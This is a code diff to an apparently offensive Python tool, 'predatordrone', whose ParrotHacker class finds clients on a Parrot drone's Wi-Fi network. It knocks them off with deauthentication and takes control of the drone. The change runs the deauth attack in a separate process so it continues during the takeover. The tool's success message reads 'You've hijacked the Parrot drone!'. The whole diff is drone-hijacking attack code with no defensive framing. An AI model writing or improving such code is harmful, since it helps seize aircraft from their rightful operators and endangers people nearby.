@@ -7,6 +7,7 @@
 from predatordrone.wifi import WifiManager, AccessPoint, Client
 from predatordrone.external_exec import do
 from predatordrone.menu import Menu
+from multiprocessing import Process
 import predatordrone.disp as disp
 import re
 
@@ -93,7 +94,7 @@ class ParrotHacker:
             self.clients.append(client)
             self.menu.add_numbered_opt(
                     ("Disconnect client", client.ip, "then take control"),
-                    lambda: self.disconnect_then_control(client)
+                    lambda: self.disconnect_and_control(client)
                 )
             disp.item1("Found client on", client)
 
@@ -121,11 +122,14 @@ class ParrotHacker:
             disp.info("Well done! You've hijacked the Parrot drone! :)")
 
 
-    def disconnect_then_control(self, client):
+    def disconnect_and_control(self, client):
         """ Disconnects a client then take control. """
         # Disconnect client
-        disp.info("Disconnecting client", client)
-        self.mon.deauth_client(client, self.ap)
+        disp.info("Disconnecting client", client, "in a separated thread")
+        deauth_process = Process(
+                target = self.mon.deauth_client,
+                args   = (client, self.ap, True))
+        deauth_process.start()
 
         # Take control
         self.take_control()
